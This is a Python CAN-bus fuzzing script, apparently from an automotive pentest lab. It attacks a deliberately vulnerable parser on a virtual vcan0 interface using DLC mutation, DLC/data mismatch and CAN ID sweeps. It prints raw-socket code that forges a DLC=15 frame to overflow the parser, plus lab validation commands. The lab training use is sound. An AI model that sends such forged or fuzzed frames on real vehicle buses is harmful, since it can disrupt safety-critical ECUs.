#!/usr/bin/env python3
"""
CAN Frame Fuzzing Script
=========================
Example script demonstrating CAN bus fuzzing techniques to discover V10 vulnerability.

Target: CAN Frame Parser Service on vcan0
Vulnerability: V10 - CAN DLC handling crash when DLC > 8 is received

This script demonstrates several CAN fuzzing techniques:
1. DLC mutation (values 0-15)
2. Data length vs DLC mismatch
3. CAN ID fuzzing

Requirements:
    pip install python-can

Usage:
    # Ensure vcan0 interface is up
    sudo modprobe vcan
    sudo ip link add dev vcan0 type vcan
    sudo ip link set up vcan0

    # Run the fuzzer
    python3 fuzz_can_frames.py

Note: This is a REFERENCE script for educational purposes.
      It demonstrates techniques that can trigger the V10 vulnerability.
"""

import can
import time
import random
import argparse
import struct
from typing import Optional


# =============================================================================
# Configuration
# =============================================================================

# Default CAN interface
DEFAULT_INTERFACE = 'vcan0'

# UDS-related CAN IDs (targets for V10)
UDS_BROADCAST_ID = 0x7DF
UDS_ECU_REQUEST_IDS = list(range(0x7E0, 0x7E8))  # 0x7E0 - 0x7E7
UDS_ECU_RESPONSE_ID = 0x7E8

# Standard CAN ID range (11-bit)
STANDARD_CAN_ID_MAX = 0x7FF

# Extended CAN ID range (29-bit)
EXTENDED_CAN_ID_MAX = 0x1FFFFFFF


# =============================================================================
# CAN Bus Connection
# =============================================================================

def connect_can(interface: str = DEFAULT_INTERFACE) -> can.Bus:
    """
    Connect to a CAN interface using python-can.

    Args:
        interface: Name of the CAN interface (e.g., 'vcan0', 'can0')

    Returns:
        can.Bus: Connected CAN bus instance
    """
    try:
        bus = can.Bus(channel=interface, interface='socketcan')
        print(f"[+] Connected to {interface}")
        return bus
    except Exception as e:
        print(f"[-] Failed to connect to {interface}: {e}")
        raise


def send_frame(bus: can.Bus, can_id: int, data: bytes,
               is_extended: bool = False, dlc: Optional[int] = None) -> bool:
    """
    Send a CAN frame with optional DLC override.

    Standard CAN frames have DLC automatically set to len(data).
    This function allows manually setting DLC for fuzzing purposes.

    Args:
        bus: CAN bus instance
        can_id: CAN arbitration ID
        data: Payload data (0-8 bytes for standard CAN)
        is_extended: Use extended (29-bit) CAN ID
        dlc: Override Data Length Code (for fuzzing DLC mismatch)

    Returns:
        bool: True if send succeeded
    """
    try:
        msg = can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=is_extended
        )
        # Note: python-can doesn't directly support DLC override for socketcan
        # In a real fuzzer, you'd use raw sockets to forge DLC values
        bus.send(msg)
        return True
    except Exception as e:
        print(f"[-] Failed to send frame: {e}")
        return False


# =============================================================================
# Fuzzing Technique 1: DLC Mutation
# =============================================================================

def fuzz_dlc_values(bus: can.Bus, target_id: int = UDS_BROADCAST_ID):
    """
    Fuzz the DLC (Data Length Code) field with values 0-15.

    Standard CAN allows DLC 0-8. Values 9-15 are technically valid DLC values
    but indicate 8 bytes of data. Some implementations incorrectly trust DLC
    as the actual data length, leading to buffer overflows (V10 vulnerability).

    The V10 vulnerability in the CAN Frame Parser occurs because:
    - Internal buffer is sized for standard 8-byte CAN frames
    - Parser trusts DLC field without bounds checking
    - DLC > 8 causes buffer overflow

    Technique:
        Send frames with DLC values from 0 to 15, observing parser behavior.
        DLC values > 8 may crash vulnerable parsers.
    """
    print("\n" + "="*60)
    print("TECHNIQUE 1: DLC MUTATION (Values 0-15)")
    print("="*60)
    print(f"Target CAN ID: 0x{target_id:03X}")
    print("Testing DLC values 0-15...")
    print("Note: DLC > 8 may trigger V10 buffer overflow vulnerability\n")

    for dlc in range(16):
        # Standard CAN payload (8 bytes max)
        data = bytes([0x00] * min(dlc, 8))

        print(f"  [*] Sending DLC={dlc:2d}, data_len={len(data)}")

        # In a real raw socket implementation, you would forge the DLC directly
        # python-can normalizes DLC to len(data), so we demonstrate the concept
        send_frame(bus, target_id, data)

        # Small delay to allow target to process
        time.sleep(0.05)

    print("\n[+] DLC mutation complete")
    print("    Check if CAN Frame Parser crashed (supervisorctl status can-parser)")


def fuzz_dlc_with_raw_socket():
    """
    Example of forging DLC with raw CAN sockets (for reference).

    This demonstrates how to send a CAN frame with arbitrary DLC
    using raw sockets instead of python-can. This is necessary
    because python-can normalizes DLC to match data length.

    WARNING: This is pseudocode/reference only - requires root privileges.
    """
    print("""
    # Raw socket CAN frame with forged DLC (pseudocode):

    import socket
    import struct

    # Create raw CAN socket
    sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
    sock.bind(('vcan0',))

    # CAN frame structure: can_id (4 bytes), dlc (1 byte), pad (3 bytes), data (8 bytes)
    can_id = 0x7DF
    dlc = 15  # Forged DLC > 8 to trigger overflow
    data = b'\\x00' * 8

    # Pack the frame with explicit DLC
    frame = struct.pack('=IB3x8s', can_id, dlc, data)
    sock.send(frame)
    """)


# =============================================================================
# Fuzzing Technique 2: Data Length vs DLC Mismatch
# =============================================================================

def fuzz_dlc_data_mismatch(bus: can.Bus, target_id: int = UDS_BROADCAST_ID):
    """
    Fuzz by creating mismatch between DLC and actual data length.

    Some implementations use DLC to determine how many bytes to read/copy
    without verifying it matches the actual data present. This can lead to:
    - Reading uninitialized memory (DLC > data)
    - Buffer overflows when copying (if buffer sized to DLC)

    Technique:
        Send frames where DLC doesn't match data length.
        With raw sockets, you can set DLC=15 but only send 2 bytes of data.
    """
    print("\n" + "="*60)
    print("TECHNIQUE 2: DATA LENGTH vs DLC MISMATCH")
    print("="*60)
    print(f"Target CAN ID: 0x{target_id:03X}")
    print("Testing mismatched DLC and data length scenarios...\n")

    # Test cases: (data_length, intended_dlc, description)
    test_cases = [
        (0, 8, "No data but DLC claims 8 bytes"),
        (2, 8, "2 bytes data but DLC claims 8 bytes"),
        (8, 15, "8 bytes data but DLC claims 15 (CAN FD territory)"),
        (4, 0, "4 bytes data but DLC claims 0"),
        (1, 64, "1 byte data but DLC claims 64 (CAN FD max)"),
    ]

    for data_len, claimed_dlc, description in test_cases:
        data = bytes([0x41 + i for i in range(data_len)])  # 'A', 'B', 'C', ...

        print(f"  [*] {description}")
        print(f"      Actual data: {data_len} bytes, Claimed DLC: {claimed_dlc}")

        # Note: python-can will normalize this, but the concept is demonstrated
        send_frame(bus, target_id, data)
        time.sleep(0.05)

    print("\n[+] DLC/data mismatch fuzzing complete")
    print("""
    For true DLC forgery, use raw CAN sockets:

    import socket, struct
    sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
    sock.bind(('vcan0',))

    # Frame with DLC=15 but only 2 bytes of real data
    # Parser may read 15 bytes from 8-byte buffer -> overflow
    can_id = 0x7DF
    dlc = 15
    data = b'AB' + b'\\x00' * 6  # Pad to 8 bytes in struct
    frame = struct.pack('=IB3x8s', can_id, dlc, data)
    sock.send(frame)
    """)


# =============================================================================
# Fuzzing Technique 3: CAN ID Fuzzing
# =============================================================================

def fuzz_can_ids(bus: can.Bus, mode: str = 'standard'):
    """
    Fuzz CAN arbitration IDs to discover hidden handlers.

    Different CAN IDs may trigger different code paths in the parser.
    Some IDs may have special handling that is more vulnerable.

    Modes:
        'standard': Fuzz 11-bit standard CAN IDs (0x000-0x7FF)
        'extended': Fuzz 29-bit extended CAN IDs
        'uds': Focus on UDS-related IDs (0x7DF, 0x7E0-0x7E7)
        'broadcast': Common broadcast/diagnostic IDs

    Technique:
        Iterate through CAN ID space, sending probe frames.
        Monitor for crashes or unexpected responses.
    """
    print("\n" + "="*60)
    print(f"TECHNIQUE 3: CAN ID FUZZING ({mode.upper()} mode)")
    print("="*60)

    # Sample UDS request data (DiagnosticSessionControl - Extended Session)
    probe_data = bytes([0x10, 0x03])

    if mode == 'uds':
        # Focus on UDS-specific CAN IDs
        target_ids = [UDS_BROADCAST_ID] + UDS_ECU_REQUEST_IDS
        print(f"Targeting UDS CAN IDs: {[hex(x) for x in target_ids]}\n")

        for can_id in target_ids:
            print(f"  [*] Probing CAN ID 0x{can_id:03X}")
            send_frame(bus, can_id, probe_data)
            time.sleep(0.1)

    elif mode == 'broadcast':
        # Common broadcast/diagnostic CAN IDs used in automotive
        broadcast_ids = [
            0x000,  # Highest priority
            0x100, 0x200, 0x300, 0x400,  # Common ranges
            0x500, 0x600, 0x700,
            0x7DF,  # OBD-II/UDS broadcast
            0x7E0, 0x7E1, 0x7E2, 0x7E3,  # UDS ECU requests
            0x7E4, 0x7E5, 0x7E6, 0x7E7,
            0x7E8,  # UDS ECU response
            0x7FF,  # Highest standard ID
        ]
        print(f"Targeting {len(broadcast_ids)} common broadcast IDs\n")

        for can_id in broadcast_ids:
            print(f"  [*] Probing CAN ID 0x{can_id:03X}")
            send_frame(bus, can_id, probe_data)
            time.sleep(0.05)

    elif mode == 'standard':
        # Sweep standard CAN ID range (0x000-0x7FF)
        # This is 2048 IDs - we'll sample every 64th ID for demo
        print("Sweeping standard CAN ID range (0x000-0x7FF, sampled)\n")

        for can_id in range(0, STANDARD_CAN_ID_MAX + 1, 64):
            print(f"  [*] Probing CAN ID 0x{can_id:03X}")
            send_frame(bus, can_id, probe_data)
            time.sleep(0.02)

    elif mode == 'extended':
        # Extended CAN IDs (29-bit) - sample a few ranges
        print("Probing extended (29-bit) CAN IDs (sampled)\n")

        extended_samples = [
            0x00000000,
            0x10000000,
            0x18DA00F1,  # ISO 15765-4 physical request
            0x18DB33F1,  # ISO 15765-4 functional request
            0x1FFFFFFF,
        ]

        for can_id in extended_samples:
            print(f"  [*] Probing extended CAN ID 0x{can_id:08X}")
            send_frame(bus, can_id, probe_data, is_extended=True)
            time.sleep(0.1)

    print(f"\n[+] CAN ID fuzzing ({mode}) complete")


def fuzz_random_can_ids(bus: can.Bus, count: int = 100):
    """
    Send random CAN frames for chaos testing.

    Generates completely random CAN IDs and data to stress-test
    the parser's error handling and bounds checking.
    """
    print("\n" + "="*60)
    print(f"RANDOM CAN FRAME GENERATION ({count} frames)")
    print("="*60)
    print("Sending random CAN IDs with random payloads...\n")

    for i in range(count):
        # Random standard CAN ID
        can_id = random.randint(0, STANDARD_CAN_ID_MAX)

        # Random data length (0-8 bytes)
        data_len = random.randint(0, 8)
        data = bytes([random.randint(0, 255) for _ in range(data_len)])

        if i % 10 == 0:
            print(f"  [*] Frame {i+1}/{count}: ID=0x{can_id:03X}, len={data_len}")

        send_frame(bus, can_id, data)
        time.sleep(0.01)

    print(f"\n[+] Sent {count} random CAN frames")


# =============================================================================
# V10 Vulnerability Specific Exploit
# =============================================================================

def exploit_v10_dlc_overflow():
    """
    Specific exploit for V10: CAN DLC Handling Crash.

    The CAN Frame Parser trusts the DLC field without bounds checking.
    By sending a frame with DLC > 8, we cause a buffer overflow when
    the parser copies DLC bytes into its 8-byte internal buffer.

    This function demonstrates the exact steps to trigger V10.

    Note: Requires raw socket access (root) to forge DLC values.
    """
    print("\n" + "="*60)
    print("V10 EXPLOIT: CAN DLC OVERFLOW")
    print("="*60)
    print("""
    Target: CAN Frame Parser service on vcan0
    Vulnerability: DLC field not validated against 8-byte buffer

    To exploit V10, send a CAN frame with DLC > 8:

    Using raw Python sockets (requires root):
    -----------------------------------------
    import socket
    import struct

    # Create raw CAN socket
    sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
    sock.bind(('vcan0',))

    # Forge CAN frame with DLC=15 (overflow!)
    can_id = 0x7DF  # UDS broadcast
    dlc = 15        # Causes overflow in 8-byte buffer
    data = b'\\x41' * 8  # Actual data (8 bytes max in struct)

    # CAN frame: can_id (4B) + dlc (1B) + pad (3B) + data (8B) = 16 bytes
    frame = struct.pack('=IB3x8s', can_id, dlc, data)
    sock.send(frame)
    print("Sent forged DLC frame - check if can-parser crashed!")

    Using cansend with CAN FD (if supported):
    -----------------------------------------
    # CAN FD allows larger DLC values natively
    cansend vcan0 7DF##1.00.01.02.03.04.05.06.07.08.09.0A.0B.0C.0D.0E

    Verification:
    ------------
    # Check if parser crashed
    supervisorctl status can-parser

    # Check crash log
    cat /var/log/automotive-pentest/crashes.log

    # Check for overflow marker
    grep CAN_DLC_OVERFLOW_DETECTED /var/log/automotive-pentest/can-parser.log

    # Validate via API
    curl http://localhost:8000/validate/can_dlc_overflow
    """)


# =============================================================================
# Main Entry Point
# =============================================================================

def main():
    """
    Main entry point for the CAN fuzzing script.

    Run with --help for usage information.
    """
    parser = argparse.ArgumentParser(
        description='CAN Frame Fuzzing Script for V10 Vulnerability Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python3 fuzz_can_frames.py --dlc           # DLC mutation fuzzing
    python3 fuzz_can_frames.py --mismatch      # DLC/data length mismatch
    python3 fuzz_can_frames.py --ids uds       # UDS CAN ID fuzzing
    python3 fuzz_can_frames.py --random 50     # 50 random frames
    python3 fuzz_can_frames.py --all           # Run all techniques
    python3 fuzz_can_frames.py --exploit       # Show V10 exploit details
        """
    )

    parser.add_argument('-i', '--interface', default=DEFAULT_INTERFACE,
                        help=f'CAN interface to use (default: {DEFAULT_INTERFACE})')
    parser.add_argument('--dlc', action='store_true',
                        help='Run DLC mutation fuzzing (values 0-15)')
    parser.add_argument('--mismatch', action='store_true',
                        help='Run DLC/data length mismatch fuzzing')
    parser.add_argument('--ids', choices=['standard', 'extended', 'uds', 'broadcast'],
                        help='Run CAN ID fuzzing with specified mode')
    parser.add_argument('--random', type=int, metavar='COUNT',
                        help='Send COUNT random CAN frames')
    parser.add_argument('--all', action='store_true',
                        help='Run all fuzzing techniques')
    parser.add_argument('--exploit', action='store_true',
                        help='Show V10 exploit details (no actual exploit)')
    parser.add_argument('--target-id', type=lambda x: int(x, 0), default=UDS_BROADCAST_ID,
                        help=f'Target CAN ID for DLC fuzzing (default: 0x{UDS_BROADCAST_ID:03X})')

    args = parser.parse_args()

    # Show exploit info if requested (doesn't need CAN connection)
    if args.exploit:
        exploit_v10_dlc_overflow()
        return

    # Check if any fuzzing technique was selected
    if not any([args.dlc, args.mismatch, args.ids, args.random, args.all]):
        parser.print_help()
        print("\n[!] No fuzzing technique selected. Use --help for options.")
        return

    # Connect to CAN bus
    try:
        bus = connect_can(args.interface)
    except Exception:
        print("\n[!] Could not connect to CAN interface.")
        print("    Ensure vcan0 is up: sudo ip link set up vcan0")
        return

    try:
        # Run selected fuzzing techniques
        if args.all or args.dlc:
            fuzz_dlc_values(bus, args.target_id)

        if args.all or args.mismatch:
            fuzz_dlc_data_mismatch(bus, args.target_id)

        if args.all or args.ids:
            mode = args.ids if args.ids else 'uds'
            fuzz_can_ids(bus, mode)

        if args.all and not args.random:
            fuzz_random_can_ids(bus, 100)
        elif args.random:
            fuzz_random_can_ids(bus, args.random)

        print("\n" + "="*60)
        print("FUZZING COMPLETE")
        print("="*60)
        print("""
Next steps:
1. Check if CAN Frame Parser crashed:
   supervisorctl status can-parser

2. Check crash logs:
   cat /var/log/automotive-pentest/crashes.log

3. Check for V10 vulnerability marker:
   grep CAN_DLC_OVERFLOW_DETECTED /var/log/automotive-pentest/can-parser.log

4. Validate via API:
   curl http://localhost:8000/validate/can_dlc_overflow
        """)

    finally:
        bus.shutdown()
        print("[+] CAN bus connection closed")


if __name__ == '__main__':
    main()
